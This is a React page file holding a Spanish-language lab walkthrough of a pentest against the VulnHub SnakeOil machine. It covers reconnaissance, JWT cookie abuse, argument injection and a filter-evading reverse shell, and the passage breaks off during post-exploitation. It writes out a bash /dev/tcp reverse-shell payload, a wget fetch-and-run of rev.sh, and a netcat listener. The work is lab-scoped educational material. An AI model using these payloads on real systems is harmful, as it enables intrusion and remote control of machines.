import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import ActivityFigure from "../components/activities/ActivityFigure";
import ActivitySection from "../components/activities/ActivitySection";
import ResourceLink from "../components/activities/ResourceLink";

const imageModules = import.meta.glob("../assets/project-01/*.png", {
  eager: true,
  query: "?url",
  import: "default",
});

const image = (number) =>
  imageModules[
    `../assets/project-01/ev-${String(number).padStart(2, "0")}.png`
  ];

const resourceBase = import.meta.env.BASE_URL + "resources/project-01";

const pageSections = [
  { id: "introduccion", label: "Introducción" },
  { id: "entorno", label: "Entorno de laboratorio" },
  { id: "descubrimiento", label: "Descubrimiento" },
  { id: "escaneo", label: "Puertos y servicios" },
  { id: "enumeracion", label: "Enumeración web" },
  { id: "vulnerabilidades", label: "Vulnerabilidades" },
  { id: "autenticacion", label: "Registro y JWT" },
  { id: "explotacion", label: "Command injection" },
  { id: "reverseshell", label: "Reverse shell" },
  { id: "postexplotacion", label: "Post explotación" },
  { id: "escalada", label: "Escalada de privilegios" },
  { id: "conclusion", label: "Conclusión" },
  { id: "recursos", label: "Recursos" },
];

const evidenceGroups = {
  environment: [
    [
      1,
      "Configuración del adaptador Host-Only de Kali Linux (segundo adaptador de red).",
    ],
    [2, "Verificación posterior del mismo adaptador Host-Only en Kali Linux."],
    [3, "Interfaz Host-Only configurada en la máquina vulnerable SnakeOil."],
  ],
  discovery: [
    [
      4,
      "Salida de ip a mostrando las interfaces lo, eth0 (NAT) y eth1 (Host-Only) de Kali.",
    ],
    [
      5,
      "Hosts activos detectados por netdiscover sobre el segmento 192.168.56.0/24.",
    ],
  ],
  scan: [[6, "Escaneo completo de puertos y detección de versiones con Nmap."]],
  enumeration: [
    [7, "Petición manual con curl al servidor nginx del puerto 80."],
    [8, "Página de bienvenida estática de SnakeOil vista desde el navegador."],
    [
      9,
      "Respuesta de curl al puerto 8080, revelando contenido generado dinámicamente.",
    ],
    [
      10,
      "Publicaciones Introduction, House Rules y Useful Links, editables sin autenticación.",
    ],
    [
      11,
      "Publicación Useful Links, que expone el uso de Flask y flask-jwt-extended.",
    ],
  ],
  vulnerabilities: [
    [12, "Enumeración de rutas ocultas con Gobuster sobre el puerto 8080."],
    [13, "Verificación individual de /login, /registration y /run con curl."],
    [
      14,
      "Verificación de /secret, /test y /users, exponiendo usuarios y hashes.",
    ],
  ],
  authentication: [
    [
      15,
      "Registro de un usuario propio en /registration y token JWT devuelto.",
    ],
    [16, "Autenticación en /login reproducida en Burp Suite Repeater."],
  ],
  exploitation: [
    [17, "Petición POST vacía a /run para identificar el formato esperado."],
    [18, "Respuesta que exige una llave secreta al enviar una URL a /run."],
    [
      19,
      "Intento fallido de acceder a /secret con el JWT en el header Authorization.",
    ],
    [
      20,
      "Acceso exitoso a /secret enviando el JWT como cookie access_token_cookie.",
    ],
    [
      21,
      "Petición a /run con la llave obtenida, ejecutando curl en el servidor.",
    ],
    [
      22,
      "Payload -V && id confirmando la vulnerabilidad de Argument Injection.",
    ],
  ],
  reverseShell: [
    [
      23,
      "Intento directo de reverse shell en Bash, bloqueado por el filtro de comandos.",
    ],
    [
      24,
      "Creación del directorio de trabajo y apertura de nano para escribir rev.sh.",
    ],
    [25, "Contenido del script rev.sh apuntando a la IP y puerto de Kali."],
    [
      26,
      "Verificación del script y servidor HTTP levantado con python3 -m http.server.",
    ],
    [27, "Listener de netcat en escucha sobre el puerto 4444."],
    [28, "Descarga del script hacia la víctima mediante wget desde /run."],
    [
      29,
      "Asignación de permisos de ejecución al script descargado con chmod +x.",
    ],
    [
      30,
      "Intento de ejecutar el script con bash, bloqueado nuevamente por el filtro.",
    ],
    [
      31,
      "Conexión recibida en el listener: shell interactiva como el usuario patrick.",
    ],
  ],
  postExploitation: [
    [
      32,
      "Estabilización de la shell con pty.spawn y confirmación de usuario y directorio.",
    ],
    [
      33,
      "Listado del directorio flask_blog y lectura del código fuente de app.py.",
    ],
    [34, "Configuración de la aplicación con dos contraseñas hardcodeadas."],
    [
      35,
      "Implementación del endpoint /run: filtro de palabras y ejecución con Popen.",
    ],
  ],
  escalation: [
    [
      36,
      "Intentos de escalar a root, exitosos únicamente contra el propio usuario patrick.",
    ],
    [37, "Permisos de sudo del usuario patrick: (ALL : ALL) ALL."],
    [38, "Acceso como root confirmado tras ejecutar sudo su."],
    [
      39,
      "Exploración adicional del directorio home de patrick y el archivo local.txt.",
    ],
    [
      40,
      "Confirmación final de acceso root y lectura de la bandera en /root/proof.txt.",
    ],
  ],
};

function EvidenceGrid({ items, start }) {
  return (
    <div className="grid gap-x-6 md:grid-cols-2">
      {items.map(([imageNumber, caption], index) => (
        <ActivityFigure
          key={imageNumber}
          src={image(imageNumber)}
          alt={caption}
          number={String(start + index).padStart(2, "0")}
          caption={caption}
          className="max-w-none"
        />
      ))}
    </div>
  );
}

function CodeBlock({ children }) {
  return (
    <pre className="my-6 overflow-x-auto border border-border bg-foreground p-5 font-mono text-sm leading-7 text-background">
      <code>{children}</code>
    </pre>
  );
}

function Project01() {
  const [activeSection, setActiveSection] = useState(pageSections[0].id);

  useEffect(() => {
    const sectionElements = pageSections
      .map((section) => document.getElementById(section.id))
      .filter(Boolean);

    const observer = new IntersectionObserver(
      (entries) => {
        const visibleEntry = entries
          .filter((entry) => entry.isIntersecting)
          .sort(
            (first, second) =>
              second.intersectionRatio - first.intersectionRatio,
          )[0];

        if (visibleEntry) setActiveSection(visibleEntry.target.id);
      },
      {
        rootMargin: "-24% 0px -62% 0px",
        threshold: [0, 0.25, 0.5, 0.75],
      },
    );

    sectionElements.forEach((section) => observer.observe(section));
    return () => observer.disconnect();
  }, []);

  return (
    <article>
      <header className="border-b border-border">
        <div className="mx-auto max-w-7xl px-5 pt-8 pb-14 sm:px-8 md:pt-10 md:pb-20">
          <Link
            to="/activities"
            className="inline-flex min-h-11 items-center text-sm font-semibold text-muted transition-colors hover:text-accent"
          >
            Volver a actividades
          </Link>

          <div className="mt-6 grid gap-12 lg:grid-cols-12 lg:items-end">
            <div className="lg:col-span-8">
              <p className="font-mono text-xs tracking-[0.18em] text-accent uppercase">
                Parcial I / Proyecto 01
              </p>
              <h1 className="mt-6 max-w-5xl text-[clamp(2.75rem,6vw,5.25rem)] leading-[0.94] font-semibold tracking-[-0.055em]">
                De la teoría a la{" "}
                <span className="font-serif font-normal italic text-accent">
                  práctica
                </span>
              </h1>
              <p className="mt-8 max-w-3xl text-[clamp(1.1rem,2vw,1.35rem)] leading-8 text-muted">
                Walkthrough técnico de reconocimiento, enumeración, explotación
                y escalada de privilegios sobre la máquina virtual SnakeOil de
                VulnHub.
              </p>
            </div>

            <dl className="grid grid-cols-2 gap-x-6 gap-y-5 border-t border-border pt-6 font-mono text-xs lg:col-span-4 lg:border-t-0 lg:border-l lg:pt-0 lg:pl-10">
              <div>
                <dt className="tracking-wider text-muted uppercase">Estado</dt>
                <dd className="mt-1 text-accent">Completo</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">Nivel</dt>
                <dd className="mt-1">Proyecto P1</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Atacante
                </dt>
                <dd className="mt-1">Kali Linux</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Objetivo
                </dt>
                <dd className="mt-1">SnakeOil</dd>
              </div>
            </dl>
          </div>

          <div className="mt-10 flex flex-wrap gap-3">
            <a
              href={resourceBase + "/184346_project_p1.pdf"}
              download="184346_project_p1.pdf"
              className="inline-flex min-h-11 items-center justify-center bg-accent px-5 py-3 text-sm font-semibold text-background transition-colors hover:bg-accent-hover"
            >
              Descargar informe
            </a>
            <Link
              to="/activities/project-01#recursos"
              className="inline-flex min-h-11 items-center justify-center border border-border px-5 py-3 text-sm font-semibold transition-colors hover:border-accent hover:bg-surface"
            >
              Ver video
            </Link>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-7xl gap-14 px-5 py-16 sm:px-8 md:py-24 lg:grid-cols-12 lg:gap-16">
        <aside className="lg:col-span-3">
          <div className="border-t border-border pt-5 lg:sticky lg:top-36">
            <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
              En este walkthrough
            </p>
            <nav aria-label="Contenido del Proyecto 01" className="mt-4">
              <ol className="space-y-1">
                {pageSections.map((section, index) => (
                  <li key={section.id}>
                    <Link
                      to={`/activities/project-01#${section.id}`}
                      aria-current={
                        activeSection === section.id ? "location" : undefined
                      }
                      className={[
                        "grid min-h-10 grid-cols-[2rem_1fr] items-center border-l pl-3 text-sm transition-[color,border-color,transform] duration-200",
                        activeSection === section.id
                          ? "translate-x-1 border-accent text-accent"
                          : "border-transparent text-muted hover:text-accent",
                      ].join(" ")}
                    >
                      <span className="font-mono text-[0.65rem]">
                        {String(index + 1).padStart(2, "0")}
                      </span>
                      <span>{section.label}</span>
                    </Link>
                  </li>
                ))}
              </ol>
            </nav>

            <div className="mt-8 border-t border-border pt-5">
              <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
                Herramientas
              </p>
              <p className="mt-3 text-sm leading-6 text-muted">
                VirtualBox · Kali Linux · netdiscover · Nmap · curl · Gobuster ·
                Burp Suite · netcat · Python
              </p>
            </div>
          </div>
        </aside>

        <div className="space-y-24 lg:col-span-9">
          <ActivitySection id="introduccion" number="01" title="Introducción">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Este proyecto aplica de forma práctica la metodología de pruebas
                de penetración sobre una máquina virtual vulnerable. El objetivo
                es reconocer el sistema, enumerar los servicios disponibles,
                analizar posibles vulnerabilidades, explotarlas y documentar
                cada paso del procedimiento técnico.
              </p>
              <p>
                El trabajo se desarrolla exclusivamente en un laboratorio
                aislado, con dos máquinas virtuales en VirtualBox: Kali Linux
                como máquina atacante y SnakeOil, distribuida por VulnHub con
                fines de aprendizaje, como máquina objetivo.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection
            id="entorno"
            number="02"
            title="Configuración de red de las máquinas virtuales"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Para las pruebas de penetración se configuró un entorno
                virtualizado con VirtualBox: Kali Linux como máquina atacante y
                SnakeOil como máquina víctima. La comunicación entre ambas se
                estableció mediante el modo de red de Adaptador Host-Only, que
                no proporciona salida hacia la red externa ni a Internet, y que
                cuenta con un servidor DHCP que asigna direcciones IP
                automáticamente a las máquinas conectadas.
              </p>
              <p>
                <strong>Kali Linux</strong> se configuró con dos interfaces de
                red: la primera en modo NAT, utilizada únicamente cuando es
                necesario el acceso a Internet para actualizar herramientas, y
                la segunda con el Adaptador Host-Only ya descrito.
              </p>
              <p>
                <strong>SnakeOil</strong>, la máquina víctima, se configuró
                únicamente con la interfaz Host-Only, de forma que puede ser
                vista por Kali, pero no tiene acceso a Internet.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.environment} start={1} />
          </ActivitySection>

          <ActivitySection
            id="descubrimiento"
            number="03"
            title="Fase 1: Descubrimiento"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Antes de escanear en busca de la IP de la máquina objetivo, es
                necesario conocer la propia IP y la interfaz por la que se está
                conectado a la red Host-Only, ya que esto permite identificar el
                rango de red sobre el cual buscar a SnakeOil.
              </p>
              <p>
                Se ejecutó <code>ip a</code>, el comando de Linux que muestra
                las direcciones asignadas a todas las interfaces de red de la
                máquina. El resultado reveló tres interfaces: <code>lo</code>{" "}
                (loopback, 127.0.0.1), <code>eth0</code> (adaptador NAT, con
                salida a Internet) y <code>eth1</code> (adaptador Host-Only, con
                la IP <code>192.168.56.102/24</code>).
              </p>
            </div>
            <CodeBlock>ip a</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con el rango de red identificado (<code>192.168.56.0/24</code>
                ), se utilizó <strong>netdiscover</strong> para detectar hosts
                activos mediante solicitudes ARP, el protocolo que traduce una
                dirección IP a su dirección MAC dentro de una red local.
              </p>
            </div>
            <CodeBlock>sudo netdiscover -i eth1 -r 192.168.56.0/24</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                <code>sudo</code> otorga los privilegios de root necesarios para
                enviar y capturar paquetes ARP; <code>-i eth1</code> fuerza el
                escaneo por la interfaz Host-Only, evitando usar por error la
                interfaz NAT; y <code>-r 192.168.56.0/24</code> define el rango
                de red a escanear.
              </p>
              <p>
                El escaneo mostró dos hosts activos: <code>192.168.56.100</code>{" "}
                y <code>192.168.56.101</code>. Revisando el adaptador Host-Only
                en VirtualBox se confirmó que <code>192.168.56.100</code>{" "}
                corresponde al equipo físico, ya que fue quien envió las
                solicitudes ARP hacia las otras dos IPs. Con esto quedó
                confirmado que <strong>192.168.56.101</strong> es la IP de la
                máquina objetivo, SnakeOil.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.discovery} start={4} />
          </ActivitySection>

          <ActivitySection
            id="escaneo"
            number="04"
            title="Fase 2: Escaneo de puertos y servicios"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                En esta etapa se busca identificar qué puertos de red están
                abiertos en la máquina objetivo y qué servicios corren detrás de
                cada uno, ya que cada puerto abierto puede ser un posible punto
                de entrada o vector de ataque a evaluar.
              </p>
              <p>
                Se utilizó <strong>Nmap</strong>, mediante un TCP SYN scan (
                <code>-sS</code>), el escaneo "sigiloso" que envía un paquete
                SYN sin completar la conexión TCP, lo que lo hace más rápido y
                menos detectable que un escaneo de conexión completa. Se combinó
                con <code>-sV</code>, para detectar la versión exacta de cada
                servicio, y <code>-p-</code>, para escanear los 65535 puertos.
              </p>
            </div>
            <CodeBlock>sudo nmap -p- -sS -sV 192.168.56.101</CodeBlock>
            <div className="overflow-x-auto border-y border-border">
              <table className="w-full min-w-[38rem] text-left">
                <thead className="font-mono text-xs tracking-wider text-muted uppercase">
                  <tr>
                    <th className="px-4 py-4 font-normal">Puerto</th>
                    <th className="px-4 py-4 font-normal">Servicio</th>
                    <th className="px-4 py-4 font-normal">Versión</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  <tr>
                    <td className="px-4 py-4">22/tcp</td>
                    <td className="px-4 py-4">SSH</td>
                    <td className="px-4 py-4">
                      OpenSSH 7.9p1 Debian 10+deb10u2 (protocolo 2.0)
                    </td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">80/tcp</td>
                    <td className="px-4 py-4">HTTP</td>
                    <td className="px-4 py-4">nginx 1.14.2</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">8080/tcp</td>
                    <td className="px-4 py-4">HTTP</td>
                    <td className="px-4 py-4">nginx 1.14.2</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El puerto <strong>22/tcp</strong> (SSH) requiere credenciales
                válidas para autenticarse, por lo que no representa un vector de
                ataque inmediato sin antes obtener un usuario y contraseña. El
                puerto <strong>80/tcp</strong> es el punto de entrada HTTP más
                común para explorar contenido web público. El puerto{" "}
                <strong>8080/tcp</strong>, un segundo servidor HTTP en un puerto
                no estándar, sugiere que podría tratarse de una aplicación
                separada del sitio principal, lo cual amerita explorarse de
                forma independiente.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.scan} start={6} />
          </ActivitySection>

          <ActivitySection
            id="enumeracion"
            number="05"
            title="Fase 3: Enumeración de puertos"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <h3 className="text-xl font-semibold text-foreground">
                Puerto 80
              </h3>
              <p>
                Como primer paso, se investigó el servidor nginx del puerto 80,
                comenzando con una petición manual antes de utilizar
                herramientas automatizadas.
              </p>
            </div>
            <CodeBlock>curl -i http://192.168.56.101</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                <code>-i</code> incluye las cabeceras de respuesta HTTP además
                del cuerpo de la página, lo que permite revisar información
                adicional del servidor. La respuesta confirmó una página de
                bienvenida estática, sin formularios, enlaces internos ni
                comentarios en el código fuente, modificada por última vez el 19
                de junio de 2021.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.enumeration.slice(0, 2)}
              start={7}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <h3 className="text-xl font-semibold text-foreground">
                Puerto 8080
              </h3>
              <p>
                Se investigó el segundo servicio HTTP, esta vez tanto con{" "}
                <code>curl -i http://192.168.56.101:8080</code> como abriendo la
                página desde el navegador. <code>curl</code> mostró una
                aplicación funcional llamada{" "}
                <em>Good Tech Inc.'s Snake Oil Project</em>, con cabeceras que
                indican contenido generado dinámicamente.
              </p>
              <p>
                Desde el navegador se identificaron tres publicaciones visibles:{" "}
                <em>Introduction</em>, <em>House Rules</em> y{" "}
                <em>Useful Links</em>, cada una con un enlace de edición, sin
                requerir autenticación para modificar el contenido. También se
                observó una sección "New Post" para crear publicaciones, también
                accesible sin autenticación.
              </p>
              <p>
                En la publicación <em>Useful Links</em> se encontró contenido
                que menciona el uso del framework <strong>Flask</strong> de
                Python junto con la librería <strong>flask-jwt-extended</strong>{" "}
                para el manejo de autenticación mediante JSON Web Tokens, un
                indicio clave sobre la tecnología backend utilizada por la
                aplicación.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.enumeration.slice(2)}
              start={9}
            />
          </ActivitySection>

          <ActivitySection
            id="vulnerabilidades"
            number="06"
            title="Análisis de vulnerabilidades y verificación de endpoints"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se ejecutó <strong>Gobuster</strong> para encontrar rutas
                ocultas o no enlazadas a la página principal, mediante un
                diccionario de palabras comunes.
              </p>
            </div>
            <CodeBlock>
              gobuster dir -u http://192.168.56.101:8080 -w
              /usr/share/wordlists/dirb/common.txt
            </CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                <code>gobuster dir</code> ejecuta el modo de fuerza bruta de
                directorios y archivos; <code>-u</code> define la URL base; y{" "}
                <code>-w</code> apunta a la wordlist de nombres comunes incluida
                por defecto en Kali. El escaneo reveló varios endpoints no
                visibles desde la navegación normal: <code>/login</code> (405),{" "}
                <code>/registration</code> (200), <code>/run</code> (405),{" "}
                <code>/secret</code> (500), <code>/test</code> (200) y{" "}
                <code>/users</code> (200).
              </p>
              <p>
                Estos hallazgos amplían significativamente la superficie de
                ataque: <code>/registration</code> sugiere la posibilidad de
                crear una cuenta sin credenciales existentes,{" "}
                <code>/users</code> podría exponer información sensible sobre
                las cuentas del sistema, y <code>/run</code> y{" "}
                <code>/secret</code>, al devolver códigos distintos a 404,
                confirman su existencia y ameritan mayor investigación.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.vulnerabilities.slice(0, 1)}
              start={12}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se probó cada ruta individualmente con <code>curl -i</code>. La
                mayoría no mostró resultados relevantes a simple vista, aunque
                es importante documentarlas como parte del proceso de
                enumeración. El hallazgo más relevante se encontró en{" "}
                <code>/users</code>, que reveló en formato JSON la lista
                completa de usuarios del sistema junto con sus contraseñas
                hasheadas, una vulnerabilidad de exposición de información
                sensible, ya que este endpoint no debería ser accesible sin
                autenticación.
              </p>
              <p>
                Esto confirmó la existencia del usuario <strong>patrick</strong>{" "}
                dentro del sistema, previamente visto solo como firma en la
                publicación "House Rules". El hash utiliza el algoritmo{" "}
                <code>pbkdf2-sha256</code>, diseñado para resistir ataques de
                fuerza bruta, por lo que intentar crackear la contraseña no es
                una ruta viable de explotación.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.vulnerabilities.slice(1)}
              start={13}
            />
          </ActivitySection>

          <ActivitySection
            id="autenticacion"
            number="07"
            title="Fase 4: Registro, autenticación y JWT"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se optó por crear una cuenta propia desde el endpoint{" "}
                <code>/registration</code>, que sugería la posibilidad de
                registrarse sin necesitar credenciales existentes.
              </p>
            </div>
            <CodeBlock>{`curl -i -X POST http://192.168.56.101:8080/registration \\
  -H "Content-Type: application/json" \\
  -d '{"username":"nobody","password":"test123"}'`}</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El registro se completó sin ninguna restricción, y el servidor
                devolvió directamente un <code>access_token</code> en formato
                JWT, sin necesidad de autenticarse por separado en{" "}
                <code>/login</code>. Esto confirma que la creación de cuentas no
                tiene ningún control de validación ni restricción de acceso.
              </p>
              <p>
                Con el usuario creado, se inició sesión formalmente en{" "}
                <code>/login</code>, esta vez utilizando{" "}
                <strong>Burp Suite (Repeater)</strong> en lugar de curl, ya que
                los siguientes pasos requerirían probar el token obtenido en
                distintos formatos, y Repeater permite modificar y reenviar la
                misma petición de forma más ágil. El servidor respondió
                confirmando la autenticación y entregando un{" "}
                <code>access_token</code> y un <code>refresh_token</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.authentication} start={15} />
          </ActivitySection>

          <ActivitySection
            id="explotacion"
            number="08"
            title="Descubrimiento del command injection"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Gobuster había marcado el endpoint <code>/run</code> con un
                código distinto a 404, por lo que se investigó con una petición
                POST vacía en el repetidor, con el fin de identificar qué
                parámetros esperaba el servidor. Esto reveló que el endpoint
                espera un parámetro con una URL en formato "url:puerto",
                sugiriendo que <code>/run</code> ejecuta algún tipo de conexión
                o petición de red.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.exploitation.slice(0, 2)}
              start={17}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Al enviar <code>{`{"url":"127.0.0.1:80"}`}</code>, el servidor
                respondió con un nuevo 400, pero con el mensaje{" "}
                <code>{`{"message":"We need your secret key!","success":false}`}</code>
                . Esto conecta directamente con el endpoint <code>/secret</code>
                , previamente descubierto con un error 500 sin autenticación,
                sugiriendo que ese endpoint provee la llave que{" "}
                <code>/run</code> solicita.
              </p>
              <p>
                Se intentó acceder a <code>/secret</code> enviando el token del
                login en el header estándar{" "}
                <code>Authorization: Bearer &lt;access_token&gt;</code>, pero la
                respuesta fue nuevamente un error 500. Dado que la aplicación
                utiliza <strong>Flask-JWT-Extended</strong>, se consultó su
                documentación oficial: por defecto la librería busca el JWT en
                el header Authorization, pero también soporta buscarlo en una
                cookie llamada exactamente <code>access_token_cookie</code> si
                el desarrollador configuró la opción{" "}
                <code>JWT_TOKEN_LOCATION</code> como cookies.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.exploitation.slice(2, 4)}
              start={19}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Al enviar el token como cookie en lugar de header, el servidor
                respondió con código 200 y reveló la llave secreta de la
                aplicación: <code>commandexecutionissecret</code>. Su nombre ya
                sugería fuertemente que <code>/run</code> ejecuta comandos del
                sistema utilizando esta clave como mecanismo de autorización.
              </p>
              <p>
                Con la llave obtenida, se envió una nueva petición a{" "}
                <code>/run</code> con la URL y la llave. La respuesta fue un
                código 500, pero el cuerpo contenía el detalle completo de la
                ejecución de <code>curl</code> contra <code>127.0.0.1:80</code>,
                incluyendo la barra de progreso y el tamaño de la respuesta,
                confirmando que el servidor efectivamente ejecuta{" "}
                <code>curl</code> con la URL proporcionada.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.exploitation.slice(4, 5)}
              start={21}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                A partir de este comportamiento, se probó si el parámetro{" "}
                <code>url</code> permitía inyectar contenido adicional al
                comando ejecutado, enviando{" "}
                <code>{`{"url":"-V && id", "secret_key":"commandexecutionissecret"}`}</code>
                . El servidor respondió con código 200 y la salida completa de{" "}
                <code>curl --version</code>, confirmando que <code>-V</code> fue
                interpretado como la opción <code>--version</code> de curl. Esto
                evidenció que el parámetro <code>url</code> se pasa directamente
                como argumento a curl sin sanitizarlo, una vulnerabilidad de{" "}
                <strong>Argument Injection</strong>.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.exploitation.slice(5)}
              start={22}
            />
          </ActivitySection>

          <ActivitySection
            id="reverseshell"
            number="09"
            title="Preparación y obtención de la reverse shell"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con la Argument Injection confirmada, se intentó inyectar
                directamente el payload clásico de reverse shell en Bash:{" "}
                <code>{`; bash -i >& /dev/tcp/192.168.56.102/4444 0>&1`}</code>.
                Este comando abre una conexión de red hacia Kali y usa esa misma
                conexión como si fuera el teclado y la pantalla de una terminal
                de Bash: todo lo que se escribe en netcat se ejecuta en la
                máquina víctima, y todo lo que Bash produce de vuelta se observa
                en la pantalla. Se llama "reverse shell" porque, en vez de
                conectarse hacia la víctima como con SSH, es la víctima quien se
                conecta hacia el atacante.
              </p>
              <p>
                El servidor respondió con código 400 y el mensaje{" "}
                <code>{`{"message":"Banned command!","success":false}`}</code>,
                confirmando la existencia de un filtro que bloquea comandos o
                palabras específicas.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(0, 1)}
              start={23}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Para evadir el filtro, se preparó un script externo{" "}
                <code>rev.sh</code> en Kali Linux, en lugar de mandar el payload
                completo directamente al servidor. Primero se creó el directorio
                de trabajo y se escribió el script con el editor nano, apuntando
                a la IP de Kali (192.168.56.102) en el puerto 4444.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(1, 3)}
              start={24}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se verificó el contenido del archivo con <code>cat rev.sh</code>
                , y se levantó un servidor HTTP simple con{" "}
                <code>python3 -m http.server 80</code> en la misma carpeta, para
                que la máquina víctima pudiera descargarlo. En una segunda
                terminal se configuró un listener de netcat para recibir la
                conexión de la reverse shell una vez ejecutada.
              </p>
            </div>
            <CodeBlock>sudo nc -lvnp 4444</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                <code>-l</code> pone a netcat en modo escucha; <code>-v</code>{" "}
                muestra información adicional sobre la conexión; <code>-n</code>{" "}
                evita la resolución de nombres de dominio; y{" "}
                <code>-p 4444</code> especifica el puerto de escucha, que debe
                coincidir con el usado en <code>rev.sh</code>.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(3, 5)}
              start={26}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con el servidor HTTP y el listener ya activos, se envió la
                primera petición para descargar el script hacia la máquina
                víctima:{" "}
                <code>{`; wget http://192.168.56.102/rev.sh -O /tmp/rev.sh`}</code>
                . La respuesta, aunque con código 500, mostró en el mensaje el
                registro completo de la descarga de wget, confirmando que el
                archivo se guardó correctamente en <code>/tmp</code>, un
                directorio que normalmente cuenta con permisos de escritura para
                cualquier usuario.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(5, 6)}
              start={28}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                A continuación se otorgaron permisos de ejecución al script
                descargado con <code>{`; chmod +x /tmp/rev.sh`}</code>. La
                respuesta no mostró ningún mensaje de error, consistente con una
                ejecución exitosa, ya que <code>chmod</code> no produce salida
                cuando tiene éxito.
              </p>
              <p>
                Se intentó entonces ejecutar el script invocándolo
                explícitamente con <code>{`; bash /tmp/rev.sh`}</code>, pero el
                servidor respondió nuevamente con{" "}
                <code>{`{"message":"Banned command!","success":false}`}</code>,
                confirmando que la palabra "bash" también está incluida en el
                filtro de comandos bloqueados.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(6, 8)}
              start={29}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Finalmente, se ejecutó el script de forma directa, sin invocar
                bash explícitamente (<code>{`; /tmp/rev.sh`}</code>),
                aprovechando que el archivo ya contaba con permisos de ejecución
                y una línea <code>#!/usr/bin/env bash</code> al inicio, que el
                sistema utiliza para determinar automáticamente el intérprete.
                Aunque Burp Suite mostró un error de "timeout expirado" en la
                respuesta —dado que el script nunca "regresa" una respuesta HTTP
                normal—, al quedar abierta la conexión de la reverse shell, en
                la terminal del listener se recibió exitosamente la conexión,
                obteniendo una shell interactiva como el usuario{" "}
                <strong>patrick</strong>, ubicada en el directorio{" "}
                <code>~/flask_blog</code>.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.reverseShell.slice(8)}
              start={31}
            />
          </ActivitySection>

          <ActivitySection
            id="postexplotacion"
            number="10"
            title="Fase 5: Post explotación"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Una vez dentro del sistema como <strong>patrick</strong>, se
                estabilizó la shell mediante una pseudo-terminal completa y se
                confirmó el usuario y el directorio actual.
              </p>
            </div>
            <CodeBlock>
              python3 -c 'import pty; pty.spawn("/bin/bash")'
            </CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                <code>import pty</code> importa el módulo de Python que permite
                crear pseudo-terminales, y <code>pty.spawn("/bin/bash")</code>{" "}
                lanza una nueva instancia de <code>/bin/bash</code> conectada a
